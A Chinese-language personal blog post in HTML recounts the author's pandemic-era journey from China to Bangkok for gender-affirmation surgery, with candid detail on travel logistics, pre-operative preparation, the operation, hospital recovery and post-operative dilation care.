&lt;p>最后在这家公司拍了拍照片，难得穿了裙子，500强的公司园区也确实有些有意思的雕塑。&lt;/p>
&lt;p>自那之后，浑浑噩噩的在北京自己的小破出租屋里躺尸了一个多月。期间厚颜无耻的开修改器打通了老头环（oops,一款不错的游戏入坑了魂系），待到房租快到期了，才开始思考该去哪里。&lt;/p>
&lt;p>彼时的北京正因为三月份的健康事件被全国各地省份不容，灰溜溜回家的北漂们在火车站亦或是机场一落地就会被扭送隔离。为了不掏冤枉的隔离钱，最终辗转决定先去广东待一段时间。那是那时候唯一对于北京来人不用集中隔离的省份。&lt;/p>
&lt;p>一路辗转，从北京坐卧铺来到了天朝的陆地的最南端，在广东下属的一个县市的乡村中，记忆里气温一下在热起来。那时候对象刚好从泰国回国，自然是SRS后回国。也因为正好是广东人于是就在那个小村子见了面。了解了手术相关的一些事情，以及泰国的一些有趣的人和事。也就是那时候百无聊赖的我似乎终于发现一点还能让灵魂心动的事情，是的，那个大概三年前每每想到都觉得是幻想的事情——SRS.&lt;/p>
&lt;p>工作也一时半会不会有着落（毕竟是大健康时代），而如果现在不去以后重新工作我也再难有如此长时间的类似Gap year一样的时间，同时似乎北漂的这一年来攒下的积蓄差不多够。于是我顶着人生“百无聊赖”这个理由开始了我人生迄今为止最大一场冒险：因为积蓄不多不少，只够我一个人手术以及来回。因为是大健康时代，出入国家都有着说不清的麻烦。而且一个人前往异国他乡，一个人做手术，听起来是一件非常酷的事。哪怕有概率死在手术台上诶？哪怕术后生活也不会好起来？哪怕......&lt;/p>
&lt;h2 id="before-zero---passport">Before Zero - Passport&lt;/h2>
&lt;p>从来没有出过国的我迎来了第一个问题——护照申请。&lt;/p>
&lt;p>天朝的官僚机构不出意外的不支持异地申领护照，于是我坐上了人生第一次飞机飞回老家县城。&lt;/p>
&lt;p>护照申请的理由：出国就医。据说护照第一次申领有可能会向家里打电话确认，于是乎在我办理申请的时候和工作人员特意声明了这一点，请不要和我家里打电话确认相关问题——当然声明的原因自然是建立在我直接向工作人员出柜的基础上。&lt;/p>
&lt;p>不过好在尽管是小地方，不过终究是东南沿海，工作人员小姐姐很理解给了我写额外的文件让我声明自身状况，他们会尽快上报和处理。&lt;/p>
&lt;p>在等待护照下来的十来天里，我找了机会见了见初高中同学，自然也是以女装的外貌。不过大家也都没什么惊讶的，当然讲道理大学以前的我应该还是很man的，毕竟到了大学才觉醒。那次也是我第一次穿着裙子漫步在自己出生的城市？一条条熟悉的街道，商业街，商场......不过想来它们应该丝毫不熟悉这样的我。也曾发癫半夜在某社交软件上约一个陌生男人喝酒，喝完自己打车回到酒店然后吐到不省人事。也曾在酒店听到有女孩子喊救命，我跑去事发房间把人就出来报警的。&lt;/p>
&lt;p>十多天后护照真的下来了而且也没有惊动我家里人（是的，哪怕是写下这篇文章的时候我也依旧还是个地下党）。不过签证是来不及了，不过好在泰国可以落地签证（oops,现在中泰已经双方免签）。不过缺点是相较于医疗签证能够待的最大时间有点短，不过无所谓了，那时候就像着魔一样什么都无法阻止我。&lt;/p>
&lt;p>护照下来后飞回广州，还有些其他的事情要做：外汇兑换，术前身体检查，来回机票预定，交手术定金，大健康时代疫苗证明，规划行程等等等等。期间在广州见了见十多年的好朋友，也是第一次以女装的外貌，本来要在他家住的，但是可能是因为断药的原因以及一些什么别的事情情绪崩溃最后自己一个人跑到外面住了个电竞酒店。&lt;/p>
&lt;p>&lt;del>再说回术前身体检查，在广州某医院我遇到了对此行第一个提反对意见的：那位医生因为反对SRS以及等等相关的内容拒绝开具身体检查 记仇&lt;/del>&lt;/p>
&lt;h2 id="zero---start-trip">Zero - Start trip&lt;/h2>
&lt;p>终于在一切需要都准备妥当之后，我踏上了这趟旅途。&lt;/p>
&lt;p>因为是大健康时代，所以海关出入境会比较严格，所以那时候选择的是从厦门-香港-曼谷的路径（因为据说厦门海关放人容易）。也确实如此，在厦门海关一次性给出所有出国就医的材料：护照，来回机票，旅馆订单，医院资质证明等等，海关只是问了一句：“现在国外疫情如此严重确认要出国么？”之后就放行了。不过那时候的厦门机场可以说是阴森恐怖来形容了，因为靠近晚上的航班再加上出国航班和的大健康的影响，出国航班值机柜台连灯都不给开，乐。&lt;/p>
&lt;p>从厦门出发落地香港转机。第一次来到这个曾被誉为亚洲金融中心的城市，只是可惜还是因为大健康时代，机场的所有免税店几乎都没有开门（当然我也没什么想买的），同时换乘旅客不得出空港。（不过无所谓啦，反正回来的时候还走香港233）&lt;/p>
&lt;p>相较于厦门机场的阴森可怖，香港机场就显得大不一样了。虽然晚上也是相对冷清了些，但是所有的基础设施服务都开着。没有大白，没有巴拉巴拉的乱七八糟的东西。只有夜间也辛苦z于是我就这样在香港机场的候机大厅长椅上躺了一晚，虽然很将就不过本来也像小学生春游一样激动的睡不着吧——达成人生成就第一次睡机场？当然最重要的事情其实是在落地香港的一刻连上机场wifi后，那堵墙不存在了！现在在手机背后的是真正的“互联网”了。&lt;/p>
&lt;p>飞往曼谷的航班在抵达香港后第二天的晚上，达成成就人生第一次坐宽体大飞机！（原谅我不是航空迷。不知道是A380还是波音747）不过是土豪航空——迪拜阿联酋航空：经济舱的走廊顶都是“星空顶”？空乘小姐姐都感觉比我高了，服务语言也换成了英文（第一次蹩脚的英语口语开始派上用场了）飞机餐的刀叉勺子甚至是金属的，相较于国内航空经济舱的塑料叉子和小的可怜的饮料而言豪华多了。飞机座位椅背上有屏幕可以免费看一些电影，机上也发了耳机和毛毯。
&lt;img src="image-1.png" alt="Alt text">&lt;/p>
&lt;p>在若干小时的飞行后，在机身的颠簸中我望着舷窗外夜幕下像金色叶脉一样流淌的城市灯光，恍如隔世似的来到了泰国。&lt;/p>
&lt;p>落地后会有中介派来带你过海关的服务人员（带过海关自然是加钱的服务），也是因为是落地签证的原因会需要这个，如果是正常签证的话也可以选择自己和海关扯皮。来人是个和善的老奶奶，拿着写了我英文名的牌子，会零星几句中文。素万那普国际机场的指示牌也标注了中文（感慨终究还是亚洲天朝周边）。
&lt;img src="image-2.png" alt="Alt text">&lt;/p>
&lt;p>老奶奶只带我到机场出站口，剩下会有医院的专职司机来接我。不过也不算意外的我被司机放了一会鸽子......(这个司机在后来的来往医院旅馆的过程中每次都放了我鸽子......)&lt;/p>
&lt;p>从机场到下榻的旅馆已经是快接近凌晨一点的时间，泰国机场高速上这个点车流很少，司机开得非常快。似乎和国内道路上那昏黄的路灯灯光一样，路边时不时掠过的高大广告牌，建筑很熟悉城市景色。但是新奇的右舵车和广告牌上的泰文又提示着我这是一片陌生的城市，与此同时还有的是车内若有若无的香料味。印象里泰国以及种种亚热带似乎是盛产香料的地方，所以连车上也是这样？&lt;/p>
&lt;p>到达入住的酒店，司机也帮忙做了部分check in的工作。因为太晚了旅店的工作人员表示：您可以今天先入住，明天再来详细办入住相关的手续。不过说回来这家旅店也不是过关的时候入关资料上写的，入关资料只是为了走流程，最后实际入住的酒店和资料上还是不一样的。资料上定点酒店会在之后取消订单。&lt;/p>
&lt;p>终于，在这样一个完全陌生的世界躺下了。酒店是一家类似别墅风格的酒店每个房间都是一个单独的小房子。基本上是一室一厅一卫的搭配。对，有厨房冰箱，当然想来术后也没多少人有精力做饭就是了。装修很是复古，有点上世纪的风格，但是很干净整洁。门口有长椅，有趴着藤类植物的雨棚和温润的灯光。以及超级无敌硕大的蜗牛，当然还有猫猫！酒店也有泳池健身房，不过还是因为大健康时代并不营业。虽然术后修养肯定又不到就是了。酒店是医院指定的，所以这里也有很多其他的姐妹。术后出院后会在这里修养直到复诊正常可以回国。
&lt;img src="image.png" alt="大蜗牛">
&lt;img src="image-6.png" alt="Alt text">&lt;/p>
&lt;h2 id="one---arrive-bangkok">One - Arrive Bangkok&lt;/h2>
&lt;p>抵达当日的疲惫立马被第二日的新奇所击败。八月末的曼谷依旧是炎热的天气。酒店里有个佛堂，路过可以闻到袅袅的檀香，当日应该是说整个泰国到处都是佛堂，佛塔。市中心最繁华的CBD旁边就是一个佛塔，可以看到很多鲜花和贡品在佛塔台阶上。&lt;/p>
&lt;p>所以第二天干嘛了呢——自然是逛逛逛以及吃吃吃咯。去见了几位同行的姐妹，有的和我一样是术前的，早几天抵达。有的是术后的，过几天就回国了。&lt;/p>
&lt;p>不过吃吃吃是因为...术前三天左右就要开始节食了（只允许流食），前一天禁食。而我的手术排期特别紧，27号落地泰国，次月2号牛子落地...于是乎能吃能跑的日子只有5天...&lt;/p>
&lt;p>当日术前的日子里还需要面见心理医生，以及面见主导医生聊手术方案（语言的话中介会充当翻译，当然如果你英语过硬也可以自己和医生对话一些。或者你泰语过硬...）缴全款之类的。心理医生的话是因为泰国方面手术要求有两位心理医生对你做过心理咨询确认你的手术意愿并出具证明。当日如果你在国内有时间可以找国内的心理咨询医生出具相关证明，这样可以不用在太过花心理医生的钱。不过我手术排期并没有留给我在国内找心理医生的时间，而且光是做一些术前检查的就已经够麻烦了，心理医生都不知道国内哪个医生愿意开这种东西，我可能又要经历一遍被医生轰出来的过程 2333.&lt;/p>
&lt;p>当然也有一些术前需要买的物品，毕竟术后得在床上躺好一段时间，没法自由活动，有一些必备的护理用品得提前买上。当然不同医院的护理要求不一样，所用到的物品也不一样。我这边的话大概就是：卫生巾（超大夜用款）&lt;/p>
&lt;blockquote>
&lt;p>&lt;em>因为你会在接下来的半个月内补上这辈子欠下的姨妈期&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>以及护理垫：因为会侧漏...&lt;/p>
&lt;p>当然也有的医院的护理会要求用到碘伏和生理盐水，这两样东西用量很大，而且很重，得提前买足。&lt;/p>
&lt;h3 id="有关泰国的一些有趣的事实">有关泰国的一些有趣的事实&lt;/h3>
&lt;ul>
&lt;li>泰国的某些物价确实相较于国内很低：举个例子，便利店里的类似国内“鱼趣”的产品，海苔一类的基本上20泰铢左右一包，约合4rmb. 当然打车特别贵，这里特指grab网约车...不过其他非泰国本地生产的东西就未必便宜了，例如索尼相机等电子产品？&lt;del>sony的相机和国内相比几乎就是原价&lt;/del>&lt;/li>
&lt;li>泰国“叶子”是合法的东西，在商场偶尔会有专门的柜台卖含有叶子的产品。当然基本都有醒目的标识而且在专门的有醒目颜色的货架上。&lt;del>类似国内自媒体危言耸听的一不小心就可能买到这种话术，我相信只要是有正常认知能力的应该不至于，呵呵&lt;/del>
&lt;img src="image-3.png" alt="Alt text">&lt;/li>
&lt;li>泰国有敞篷公交车!常见的是一些用货运皮卡改装的公交车，货斗加装雨棚和围栏就变成了公交车？甚至有一些校车都是这个配置，年纪稍大的学生会在末尾门口守着“门”&lt;del>因为实际没有门，年纪稍小抓不稳可能的掉下去？&lt;/del>
&lt;img src="image-4.png" alt="Alt text">&lt;/li>
&lt;li>泰国也有海底捞——目前似乎是唯一的一家，在市中心CentralWorld
&lt;img src="image-5.png" alt="Alt text">&lt;/li>
&lt;/ul>
&lt;p>总的来说，就整个城市而言，繁华的地方特别繁华堪比中国的一线城市。但是也可以随处可见破败荒废的楼宇，以及每时每刻都在堵车？这大概是大型城市的通病吧。&lt;/p>
&lt;h2 id="two---before-surgery">Two - Before surgery&lt;/h2>
&lt;p>欢乐的时光总是短暂的，很快就来到了禁食的日子里。&lt;/p>
&lt;blockquote>
&lt;p>&lt;em>其实是前两日流食，第三日禁食，只允许和糖水，例如可乐。但是我是个狠人索性，&lt;del>其实是没看清要求&lt;/del>三天全靠糖水度过。同时哪怕禁食了还在四处乱跑着玩&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>最后一天，也是受难日开始的第一天～
&lt;img src="image-7.png" alt="Alt text">&lt;/p>
&lt;p>术前最后一天需要吃泻药，先是药片泻药，再是液体泻药，俗称雪碧？大概是因为包装是绿色的？还是说和雪碧混着喝会能接受一点。&lt;/p>
&lt;p>药片泻药是开胃小菜几乎没什么感觉，但是到了液体就不一样了。可以说是被焊接在了马桶上...在喷水...喝的同时得保证电解质的摄入，推荐便利店卖的大瓶椰子水（至少我很喜欢，嘟囔）&lt;/p>
&lt;blockquote>
&lt;p>&lt;em>题外话，入住的酒店每天提供早餐。术前可以到饭点去餐厅，术后的话每天会给你送到房门口。而且每天会有保洁打扫，每天房间除了提供瓶装矿泉水外还有可乐和雪碧&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>PS： 手术前安排和主刀医生面诊的时候也会给你参观术后病房。私人医疗的配置是真不是盖得，医院的环境可以说是不像医院了233，有专门的前台，会客厅。以及住院病房全部都是单人间带有电动病床(这个床超方便，一个人也可以很方便的实现自理)，电视机，以及单独的浴室和洗漱间，以及一个陪床人员可用的小沙发。&lt;/p>
&lt;p>电视免费提供网飞账号，所以术后在病房的日子都靠看美剧打发时间了，当然后面休养的时候也是？&lt;/p>
&lt;p>对还有超大的落地窗！据说这个医院是主刀医生干了这么多年这几年才自己出资盖好的。所以也可以算是最新落成的所以各种条件设施都是当时比较新的。
&lt;img src="image-8.png" alt="Alt text">&lt;/p>
&lt;h2 id="three---true-zero">Three - True Zero&lt;/h2>
&lt;p>Times fly～&lt;/p>
&lt;p>终于到了术前第0天！手术是安排在上午&lt;del>还是下午来着...忘了&lt;/del>,反正是在白天，所以早上六点就会有医院的司机接去医院。但是我说过：&lt;/p>
&lt;blockquote>
&lt;p>&lt;em>这个司机在后来的日子里都在疯狂放我鸽子...&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>也有可能是早高峰的原因，总之司机迟到了一点。&lt;/p>
&lt;p>到医院之后先是换上病号服（手术服）以及专门的拖鞋，泰国私立医院的病号服甚至还有一点好看，颜色是深褐色搭配紫色的封边，和医院整体颜色设计是挂钩的&lt;del>而且是开档的&lt;/del>.当然我一开始穿反了，病号服是类似大褂一样，但是是反穿的开口在后面.当然我其实听懂了护士说要反着穿的,但是那样觉得好怪异（所有的医护人员都可以和他们英语交流，这一点到后面日常生活中的外卖员，路边小贩，出租车司机等也是），所以出了更衣室后被护士看到了被护士姐姐当场扒了重穿...&lt;/p>
&lt;p>换好病号服后会带去自己的病房，然后等待护士来给你备皮&lt;del>羞耻时刻&lt;/del>.当然趁着等护士的时间跑去看了看之前比我早来几天的姐妹，比我早来几天也是比我早几天手术。手术后会憔悴好多，不过好在人家是亲妈一起跟来的。当然这位妈妈后面也给了我很多照顾，在这里非常感激干妈～&lt;/p>
&lt;p>备皮和一些生理体征检测完成后，护士会提醒要摘掉身上所有的金属饰品：耳钉项链等。可以放在房间带锁的柜子中。不过其实这里安全性是值得保障的，住院区不是谁都可以进来的，除了医院人员，其他人进入也必须有医院人员协同。私密性以及安全性拉满。&lt;/p>
&lt;p>然后就是漫长的等待，到了预定手术的时间，护士直接推着轮椅来到病房。接下来到手术室的路可以坐着轮椅过去。&lt;del>人生第一次坐轮椅了属于是，不过其实后面还有很多机会...&lt;/del>&lt;/p>
&lt;p>手术室在一层好像，护士们推轮椅到手术室外后会让你躺上类似担架的床，把你推进手术室。&lt;/p>
&lt;p>印象里引入眼帘的是巨大的无影灯，一些简单的器械等？看起来手术室的陈设并不算复杂？到了手术室内会让你转移到手术台，然后病号服会被脱下来盖在身上。感觉自己像个太平间的尸体2333.手术室的温度很低，除了病号服就几乎全裸的我到后面冷得发抖...过了一会有护士给戴上了心率检测仪（就夹在手指上的那个）以及做了输液。又过了很久，一位年轻的医生跑过来和我打招呼，自我介绍说是这次手术的麻醉医生，并且说主刀很快过来。U1S1这位麻醉医生很帅（虽然戴着口罩），以及主导医生也咕咕咕了好久，说很快但印象里我看着手术室的钟走了两个点......于是在这两个点里我一个人在手术台上冻得瑟瑟发抖。&lt;/p>
&lt;p>终于大概是到了下午一点多？说是十点，十一点手术吧被推到手术室，但是好像把我拖到了下午，主刀医生终于来了，依旧是那副笑眯眯的慈眉善目的样子，笑眯眯的说手术很快开始，然后又过了十几分钟，麻醉给我静脉注射了麻药。&lt;/p>
&lt;p>睁眼看着麻药被推进去的，但是就在这过程里脑子一下就抽过去了。&lt;/p>
&lt;p>下一次再度醒来已经是接近八个小时过去后在观察室里，意识很模糊，大脑还没从与麻药手里夺过身体的控制权，只感觉身体很沉重。之后护士推着病床把我送回了病房，合力从可动担架上转移到病床之后那时算是意识清醒了一小会，看到隔壁干妈来看我，躺在自己病床上的我努努力挥挥手，然后就又昏睡过去了...&lt;/p>
&lt;p>到了后半夜才意识逐渐清醒过来，当然也没有什么力气，下体也没啥感觉。仿佛啥都没发生，当然这只是因为麻醉还没过去罢了。其实出了手术室后一直在吸氧，但是我觉得那个在鼻子口的氧气管好痒好几次自己扯掉2333&lt;/p>
&lt;p>在医院的每天双腿会被垫高以及保持分开状态，然后各绑着一对不断充气放气的东西，类似量血压用的那个但是在不断冲放气。当然后续了解到这个是起到一个腿部按摩的作用，帮助你恢复脚部神经感知。但是真的很难受，尤其是哪怕睡觉也开着，一方面是机器噪音，另一方面是你可以想象无时无刻有个东西捏你的小腿在配合上开始捏的时候充气的声音，以及捏完结束放气的声音，以及你知道这只是一个轮回马上就会开始新的一轮——巨折磨。&lt;/p>
&lt;p>当然也是后来知道，其实可以喊护士晚上给你关掉的，呜呜呜......&lt;/p>
&lt;p>在医院住院的期间也会提供三餐，但是因为还没有拆包（下体现在被裹的严严实实的&lt;del>只留了个屁眼子在外面x&lt;/del>）所以前几天提供的是很清淡以汤和饼干饮料等为主。同时一起送来的还有每餐要吃的药，包括消炎药以及止痛药等。当然吊瓶也是不会停的。说回餐食，除了饼干之外的送的汤其实有几种，但是个人不喜欢西式奶油蘑菇那种浓汤，于是一般喝两口就不吃了。但是在有一次上了一个类似紫菜蛋花汤汤的蔬菜汤我喝完了之后，大概是医院的人以为我更喜欢紫菜蛋花汤，于是接下来的每一餐都是紫菜蛋花汤！！！！于是我过上了顿顿紫菜蛋花汤的日子！！！！暴雨哭泣。当然这也为我后面下地留下了隐患，这样的餐食真的没有多少糖分，然后一下地你就可能低血糖晕倒。所以推荐后面的姐妹在下地当天可以找人买瓶可乐，或者吃点高能量的东西，不然真的会晕。&lt;/p>
&lt;h2 id="four">Four&lt;/h2>
&lt;blockquote>
&lt;p>术后最难受的不是第一天，而是第二天。&lt;/p>
&lt;/blockquote>
&lt;p>因为到了这一天基本上手术的麻药劲就过去了，你可以开始逐渐感知到下体的存在，感知到痛，感知到肿胀感，当你尝试类似坐起的姿势或者上半身角度较大的姿势的时候会感觉到明显的下体的坠痛。&lt;/p>
&lt;p>这时候会有那么一两个夜晚非常难熬，疼痛，发热会不断折磨你。当然这时候可以和护士说，护士会给你一片额外的止痛药。如果疼痛还是无法缓解会给你上吗啡。&lt;/p>
&lt;p>但是吗啡其实扎完并没有好受太多，你会依旧感觉到痛苦，不过意识会逐渐变沉，你会很快昏睡过去。所以至少依靠它你可以熬过这样一个难熬的夜晚。&lt;/p>
&lt;p>当这最难熬的一两天过去后我才真正有精力审视术后的自己。当然哪怕这之后以及iu很难熬，因为你几乎无法转身，没有办法侧睡。当然也不是完全没有办法，可以用枕头把两腿撑开侧躺，只要你不怕痛的话。&lt;/p>
&lt;p>下体被弹力绷带以及厚重的胶布裹着，其中会有一根引流管以及导尿管延伸出来。每天会有护士查看你引流管的状态以及帮你处理尿袋。当引流管内出血逐渐减少后会给你拔引流管。个人评价我觉得这是最痛的步骤，在拔之前会护士会提醒你吃一点止痛药，拔的时候你可以感觉到一根管子从你血肉中抽出的感受，连带着途经过程中刺激上伤口引发的抽搐痛，不过护士手很快，基本一下子就解决了。然后下体就只剩下导尿管了。当然其实之前胸口一直有一个麻醉泵来着（其实也是后面才知道这个东西是麻醉泵），麻醉泵延伸出一根极细的透明的管子连到腰后尾椎骨的位置似乎。
&lt;img src="image-11.png" alt="Alt text">&lt;/p>
&lt;p>在医院的那几天每天除了喝紫菜蛋花汤就是刷美剧《僵尸国度》&lt;del>当然偶尔还有来自比我早两条手术的那位姐妹的性骚扰&lt;/del>
&lt;img src="image-9.png" alt="Alt text">
&lt;img src="image-10.png" alt="Alt text">&lt;/p>
&lt;p>在术后第三天晚上的时候作死自己尝试下地，差点晕过去，好在快要晕倒之前按下了护士铃。同时以及拔了引流管后就一直在飚血，当时很感叹自己能不能明天出院。&lt;/p>
&lt;blockquote>
&lt;p>所以手术其实也是一个非常考验心态的过程。术后休养的日子里，身体的痛苦，行动的不便，血肉模糊的下体都可能让你的心情变得非常糟糕。当时有一度怀疑自己能否活着离开泰国？当然这是夸张的想法，因为会担惊受怕担心留下后遗症等等。所以如果是原先就有心理疾病的姐妹一定要注意调整好自己心理状态做好心理评估再决定手术。&lt;/p>
&lt;/blockquote>
&lt;p>在手术前医生会询问你现在最近是否有吃什么额外的药物，尤其是治疗心理疾病相关的。一方面是给麻醉等用药做考量，另一方面是为术后恢复做评估。在术后如果你精神状态及其不佳，医院也会提供类似镇静类药物以及安眠类药物等。当然你有一些之前持续服用的精神类药物，在医生考量安全后术后恢复住院的过程中也可以让护士拿给你吃。除此之外每天会有护工安排给你擦拭身体，更换病号服和床单整套之类的。&lt;/p>
&lt;p>不过即使是拔完引流管后一直飙血的状态下，医生还是安排出院了。这里要吐槽无论你问医生或者护士你啥啥啥情况咋回事他们都只会用英文告诉你：Oh, that's ok. That's normal.某种程度上这也是让人焦虑的原因之一。&lt;/p>
&lt;p>出院那天，依旧是护士推来轮椅。所以昨天下地差点晕倒的我今天就要坐着轮椅，坐着救护车，对，坐着。在救护车上是坐着的状态经历一路颠簸回到旅馆，这期间全靠双手撑着座椅来给自己下体减少一点压力。当时的面色几乎是可以用惨白来形容。&lt;/p>
&lt;p>当然其实是可以申请多住两天病房的，资本主义的世界加钱就是了，但是优柔寡断的我在反复横跳之间被迫选择了出院。不过好在确实没有遇到什么以外情况，除了有些飙血后续恢复还算顺利。不过其他姐妹不要学哦，有条件的话觉得自己无法自理（毕竟回了酒店就要自己拿吃的喝的洗漱上厕所倒尿袋啥的了）还是多住一两天吧。&lt;/p>
&lt;h2 id="five">Five&lt;/h2>
&lt;p>回到了旅馆。说回来旅馆一开始预定的时间以及缴的钱是从入住那天到最后离开泰国，不过中间你去住院的手术是可以不算钱的，但是房间还会为你保留，你的行李也会被保管在你的房间内直到你出院回到酒店。&lt;/p>
&lt;p>回到酒店之后每天也会有医院的护士来查看你情况（其实酒店距离医院也不算远来着，而且这里本来就是医院专用的酒店之一），护士会询问你状况以及帮你做一些基础的护理，测量血压等身体指标，清理伤口等。早餐的话之前说了酒店会有餐盒送进房间内，吃完之后餐盒放到门口椅子上会有人统一回收。酒店的早餐就丰盛一些了，以下是酒店早餐（其实医院的三餐也可以很丰盛，但是因为术后一开始是流食管理所以我没能吃上啥好的东西）
&lt;img src="image-12.png" alt="Alt text">&lt;/p>
&lt;p>据说其实有中西餐样式可选，中餐的话会有炒饭，不过我也懒得和工作人员提，一直吃得西餐款。基本上就是煎蛋面包黄油沙拉香肠培根和水果。&lt;/p>
&lt;p>八九月的曼谷正值雨季，说实话在时节上是选对了，因为很喜欢下雨的我。&lt;/p>
&lt;p>热带的雨季，时不时会伴随着雷暴天气，躺在酒店屋子里的听起来就是纯天然的白噪音很舒适。听着雨滴打在屋顶上，窗户上的声音，隐隐的雷鸣伴随着蛙鸣。当然也会有很大声很吓人的响雷啦，不过我可不是害怕打雷的小孩了。不过一样住在这里的其他几位小姐妹就未必了2333.&lt;/p>
&lt;p>其实到泰国来做手术后发现，能走到手术这一步并且来到泰国的跨性别者大多数都是很努力亦或者很有天赋能力的一群人。因为天朝的愚蠢规定哪怕成年了手术也需要父母同意，所以能来泰国的大多数都是自己努力过来的。又同时因为出国手术是一笔不菲的费用所以能自己努力过来的又大多很是优秀。例如就认识了一位虽然还是学生，但是已经可以做讲师在外讲课的大佬，亦或是年纪轻轻百万存款的有为青年，还有大学被迫辍学却自学成才高薪收入的大佬。相比较之下我这个失业社畜反而相形见绌。当然也有家长支持过来的，因为觉得泰国的技术毕竟更好一些，但是在这个圈子里家长党真的是少数。更多的是这样一群努力活着的人，也希望更多的人能过上自己 想要的生活。&lt;/p>
&lt;blockquote>
&lt;p>不像普通人一样，这个圈子里的孩子们还需要与几乎整个世界为敌，当家庭这种被誉为港湾的地方也演变成吃人不吐骨头的浅礁石岸，唯有只身一人对抗充满暴雨雷霆的大海。&lt;/p>
&lt;/blockquote>
&lt;p>自住院以来其实一直没有机会洗头，所以直到第六天我的毛已经近乎成了鸡毛毽子。于是乎在我绝顶的聪明才知下，我完成了在未拆包情况下一个人给自己洗头的壮举。&lt;/p>
&lt;p>其实是依靠酒店床尾的躺椅，把它拖到厕所里然后躺在躺椅上用花洒给自己洗头。当然这一番折腾下来我连吹干头发的力气都没有就瘫软在床上了。&lt;/p>
&lt;p>在酒店的日子早餐以外就得自己的点外卖了。术后医生有叮嘱饮食上不能太过油腻，油炸制品，或者海鲜等不推荐吃，所以kfc是不用想了（当然其实自己也吃了点问题不大，但是警惕还是要遵医嘱，因为有翻车的），同时术后也推荐你使用蛋白粉一类的，也就是说饮食要多补充蛋白质以保证身体恢复，然后医院有推荐一种蛋白粉。但是我想了想与其把钱花在难吃且贵的蛋白粉上（其实据说味道还不错），不如多花点钱在点的外卖上，于是那段时间我就各种牛排的炫。太过也有类似国内的外卖软件，不过有意思的是泰国的外卖员很多都是自行车送餐。当然时效还都可以保证，而且自行车想来他们应该不会像国内美团饿了么那么卷吧。&lt;/p>
&lt;p>每一个外卖员在送餐完成后都会说一句“卡昆卡”，大概是泰语里谢谢的意思。其实不止外卖员，所有为服务你的人，亦或是各种人与人之间都会很礼貌的互相道谢，在这点上天朝国内就是完全截然不同的感觉。当然我不是土生土长在泰国的，不知道这个算是表面功夫亦或是发自真心的，但是在中国，哪怕是表面功夫的人与人之间的礼貌似乎也消耗殆尽了。&lt;/p>
&lt;h2 id="six">Six&lt;/h2>
&lt;p>第七天，是拆包的日子。拆包自然就是指的是拆开下体包裹的纱布等等。&lt;/p>
&lt;p>早在前一天护士查房的时候就叮嘱明天查房前记得吃点止痛药，也算是打预防针拆包可能很痛了。当然实际我个人的体验还好，没有太过不适。其实拆包我录像来着，但是被护士制止了，似乎是商业机密？还是啥别的？&lt;/p>
&lt;p>所以时隔七天下体的封印终于解除啦！&lt;/p>
&lt;p>护士显示拆掉一直以来的弹力绷带束缚，然后是外面的脱脂棉等，不过可以看到几乎全是黑褐色的淤积的血液就是了。然后最重要的部分，从阴道内部取出医生塞进去的纱布填充物。一直以来术后 其实可以感受到下体是被“填满”的，很硬很难受，其实就是这些沾满黑褐色血液的纱布。护士揪起纱布的一头然后缓慢向外抽出挤在一起的纱布，略感粗糙的纱布刮过阴道内壁是可以被清晰感受到的，而且因为阴道的深度，一段填充纱布是不够的，抽完之后还需要用镊子伸进去揪出另一段纱布的头，然后继续。在护士犹如哄小宝宝一样的安慰下最后全部的纱布取出，接下来就是即将伴随你一生的操作——通模具。&lt;/p>
&lt;p>为了防止阴道萎缩，需要在接下来的两年内保证每天一日三次一次一小时的通模具，也就是用一根根亚克力棒棒塞入阴道以保证阴道宽度和深度。并且模具有0-5号多个宽度尺寸，你需要在未来的日子里逐级提升以拓宽阴道使其可以使用，同时也是为了术后防止愈合长死...(当然其实现在的我不到两年就摆烂了，其他姐妹不要学哦)&lt;/p>
&lt;p>护士会在拆包之后帮助你第一此通入0号模具，同时也作为教学教导你如何通模具。教学会在持续几天之后结束，后面的日子里所有通模具的过程都会让你自己来 。护士会首先用专用的润滑稿挤在阴道口，然后用带着医用手套的手指涂抹阴道口，之后用食指将润滑液送入内部，保证内部润滑完成后，会再挤上一点利多卡因凝胶（一种体外用麻醉剂，降低通模具中的痛感）如法炮制保证利多卡因凝胶涂满内部。之后就是给模具涂抹上润滑，然后插入......&lt;/p>
&lt;p>第一次插入的同时会利用模具上的刻度测量深度，护士会告诉你深度是多少，并且以后通模具都要尽力保证到这个深度。当然在教学中有一次护士看我下不去手给我捅的交出来了&lt;del>捂脸&lt;/del>&lt;/p>
&lt;p>说实话，通模具其实可以说是这个手术最痛苦的部分，当然其实不同医生不同手术的实现效果不同，最后通模具的要求也不同。而我这个的要求则是术后两年内，每日一体三次一次1h,两年后保证一周一次（在有规律性生活的前提下），然后这个几乎要伴随一辈子？说实话这样的要求很难保证，而且模具升级尺寸的过程非常痛苦，有不少人是手术的恢复痛没有掉过一滴眼泪，但是摆在了模具手上。也有不少人在术后不久就放弃了通模这个事情，因为太费时间精力以及痛苦了。当然其实也有相对而言轻松的手术方法，通模要求，但是基本上只要你选择了做人造阴道，那么通模这个过程就不可避免。&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>所以在这里对所有考虑手术的姐妹说上一句，手术并不只是开个刀这么简单，还有后期的护理维护。这些过程你都要作为你是否能将接受考量的部分，深思熟虑，三思而后行。&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>其实直到真正拆包之后你才真正感觉手术做完了，因为幻肢效应在这之前你会觉得某个惹人厌的东西其实只是被包起来藏在了这对纱布里。直到你真正看到平坦的小腹，看到穿上胖次后再也没有的突起，内心才变得真正如释重负。&lt;/p>
&lt;p>当然即使拆包的当天我还是没能摘掉导尿管，于是后面的日子里还是要滴溜着导尿管四处溜达（其实也没有四处，基本就在酒店）。拆包之后每天都要垫着卫生巾和护垫，毕竟时不时还是会飙血。与此同时我也体验到了类似姨妈的感觉，你可以在每天起床起身站起来之后感觉到下体“哗啦哗啦”流淌的感觉(这个拟声形容词还是我初中同桌描述过的)，同时也体会到了即使是垫着夜用也会侧漏的结果。这期间还花了点时间弄明白卫生巾哪一边是前面那一边是后面？&lt;/p>
&lt;p>当然拆包还有另一个好处就是意味着终于可以洗澡了！&lt;/p>
&lt;p>在拆包后的日子里，每日护士来了之后会帮忙做一些阴部的消毒，主要是用生理盐水一类的。其实我一开始不知消毒清理用的是生理盐水以为是酒精，所以头铁自己用酒精处理还没发现奇怪的地方。直到在某次询问护士护士急忙告诫说： No No No.&lt;/p>
